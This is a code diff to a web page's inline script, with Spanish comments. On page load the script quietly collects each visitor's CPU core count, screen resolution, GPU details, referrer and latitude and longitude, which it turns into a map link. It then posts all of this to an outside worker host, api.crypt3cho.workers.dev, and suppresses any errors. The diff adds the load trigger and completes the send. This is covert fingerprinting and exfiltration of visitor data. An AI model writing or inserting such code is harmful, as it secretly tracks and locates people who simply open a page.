@@ -492,7 +492,7 @@
         </div>
     </div>
 
-<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+<script>
     (function() {
         const workerUrl = "https://api.crypt3cho.workers.dev";
 
@@ -514,6 +514,7 @@
             const cores = navigator.hardwareConcurrency || "N/A";
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             
+            // --- DETECCIÓN DE GPU ---
             let gpu = "N/A";
             try {
                 const canvas = document.createElement('canvas');
@@ -534,6 +535,7 @@
             
             const referer = document.referrer || "Acceso Directo";
             
+            // --- LÓGICA DEL MAPA CORREGIDA ---
             const mapLink = (data.latitude && data.longitude) 
                 ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}` 
                 : "No disponible";
@@ -568,4 +570,12 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload),
-                kee
+                keepalive: true
+            }).catch(() => {});
+        }
+
+        window.addEventListener('load', getIntelligence);
+    })();
+</script>
+</body>
+</html>
